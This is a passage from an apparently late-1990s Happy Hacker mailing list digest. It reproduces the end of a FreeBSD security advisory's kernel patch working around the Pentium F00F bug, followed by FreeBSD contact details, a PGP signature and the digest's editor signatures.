+     +                          goto restart;
+     +#endif
+                        if (i == 0)
+                                goto out;
+
+     @@ -642,7 +655,18 @@
+        if (va >= KERNBASE) {
+                /*
+                 * Don't allow user-mode faults in kernel address space.
+     +           * An exception:  if the faulting address is the invalid
+     +           * instruction entry in the IDT, then the Intel Pentium
+     +           * F00F bug workaround was triggered, and we need to
+     +           * treat it is as an illegal instruction, and not a page
+     +           * fault.
+                 */
+     +#if defined(I586_CPU) && !defined(NO_F00F_HACK)
+     +          if ((eva == (unsigned int)&t_idt[6]) && has_F0 0F_bug) {
+     +                  frame->tf_trapno = T_PRIVINFLT;
+     +                  return -2;
+     +          }
+     +#endif
+                if (usermode)
+                        goto nogo;
+
+
+=============================================================================
+FreeBSD, Inc.
+
+Web Site:                       http://www.freebsd.org/
+Confidential contacts:          security-officer@freebsd.org
+PGP Key:                        ftp://freebsd.org/pub/CERT/public_key.asc
+Security notifications:         security-notifications@freebsd.org
+Security public discussion:     security@freebsd.org
+
+Notice: Any patches in this document may not apply cleanly due to
+        modifications caused by digital signature or mailer software.
+        Please reference the URL listed at the top of this document
+        for original copies of all patches if necessary.
+=============================================================================
+
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.2
+
+iQCVAwUBNI2g9VUuHi5z0oilAQGFnAP/R4bArrM7+NZKbrJEK+9UpNYBPhsakAF6
+4/U1wJJdbBJPl5j4udZki8ZUEPJvM2mSnrs9UevQMYGSoirl92h/0SEgVgjIfhcJ
+tcyY97Js6biHAZzib4i/TKoN47wBNjgRLF6SfafuIxfVQYk6RMFB5EUdYBdseVz/
+5RgYqQz4m/k=
+=xvTs
+-----END PGP SIGNATURE-----
+
+================================================================
+To subscribe to Happy Hacker Digests use the subscribe boxes on the menubar
+with message "subscribe happy-hacker" in the body of your message.
+Want to share some kewl stuph with the Happy Hacker list? Correct mistakes?
+Send your general questions to , Windows messages to
+Roger Prata, Mac stuff to Strider, and Unix questions to ">Carolyn Meinel.  To send Carolyn confidential email (please, no
+discussions of illegal activities) use ">and be sure to
+say this message is not for the Digest! Direct flames to
+dev/null@cmeinel.com. Happy hacking!
+================================================================
+Carolyn Meinel
+M/B Research -- The Technology Brokers
+http://cmeinel.com
+
+"Inside every digital circuit, there's an analog signal screaming to get
+out." -- Al Kovalick, Hewlett-Packard
+
+"Hex, Bugs, Rock & Roll" -- Bruce Conklin, Space Dynamics Lab, Utah State U.
+
+~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~
+R.J. Gosselin, Sr.                rjg@computersource1.com
+Network Security Analyst
+Editor-In-Chief - Happy Hacker List
+~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~
+Computer Source 1			www.computersource1.com
+V/ 704-983-1000			F/ 704-982-3077
+~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~
